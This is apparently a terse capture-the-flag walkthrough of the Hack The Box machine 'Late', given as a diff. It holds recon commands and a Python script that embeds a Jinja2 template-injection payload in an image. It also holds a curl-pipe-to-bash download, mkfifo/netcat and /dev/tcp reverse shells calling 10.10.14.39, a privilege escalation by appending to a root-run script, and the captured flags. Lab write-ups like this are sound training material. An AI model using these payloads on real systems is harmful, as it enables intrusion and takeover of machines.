@@ -1,0 +1,130 @@
+Late
+_______
+
+sudo nmap 10.129.227.134 -sCVS -A --min-rate 10000
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
+|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
+|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: Late - Best online image tools
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8080/tcp)
+HOP RTT      ADDRESS
+1   89.52 ms 10.10.14.1
+2   89.79 ms 10.129.227.134
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+echo 10.129.227.134 late.htb images.late.htb | sudo tee -a /etc/hosts
+10.129.227.134 late.htb
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+ffuf -u http://late.htb/ -H 'Host: FUZZ.late.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac -t 20
+
+images                  [Status: 200, Size: 2187, Words: 448, Lines: 64, Duration: 110ms]
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+import sys
+from PIL import Image, ImageDraw, ImageFont
+
+
+def main():
+    img = Image.new('RGB', (2000, 1000))
+    draw = ImageDraw.Draw(img)
+    myFont = ImageFont.truetype('LiberationMono-Regular.ttf', 15)
+    payload = """{{{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen("{cmd}").read()}}}}""".format(cmd=sys.argv[1])
+    draw.text((0,3), payload, fill=(255,255,255), font=myFont) # payload
+    img.save('payload.png')
+
+if __name__ == "__main__":
+    main()
+----------
+
+python file.py id
+---
+cat result.txt
+
+<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
+--------
+
+python payloader.py 'cat /etc/passwd'
+cat results.txt
+
+<p>root:x:0:0:root:/root:/bin/bash
+...
+svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
+...
+---------
+
+python payloader.py 'cat ~/user.txt'
+---
+
+cat results.txt
+<p>42a1f7920d4bbadf022989b7c73df27c
+----
+
+file.sh
+#!/bin/bash
+rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk | /bin/sh -i 2>&1 | nc 10.10.14.39 1337 >/tmp/wk
+---
+
+python3 -m http.server 8000
+---
+
+python payloader.py 'curl http://10.10.14.39:8000/file.sh | bash'
+---
+
+nc -lvnp 1337
+
+Listening on 0.0.0.0 1337
+Connection received on 10.129.227.134 50896
+/bin/sh: 0: can't access tty; job control turned off
+$
+----
+
+find / -type f -user svc_acc 2>/dev/null
+
+/usr/local/sbin/ssh-alert.sh
+----
+
+cat /usr/local/sbin/ssh-alert.sh
+#!/bin/bash
+
+RECIPIENT="root@late.htb"
+SUBJECT="Email from Server Login: SSH Alert"
+
+BODY="
+A SSH login was detected.
+
+        User:        $PAM_USER
+        User IP Host: $PAM_RHOST
+        Service:     $PAM_SERVICE
+        TTY:         $PAM_TTY
+        Date:        `date`
+        Server:      `uname -a`
+"
+
+if [ ${PAM_TYPE} = "open_session" ]; then
+        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
+fi
+---
+
+echo "bash -i >& /dev/tcp/10.10.14.39/1337 0>&1" >> /usr/local/sbin/ssh-alert.sh
+
+start nc -lvnp 1337 on local and exit from server
+----
+
+root@late:/# cat /root/root.txt
+cat /root/root.txt
+
+f1c3e0799bbb9a6e6522850d464a6817
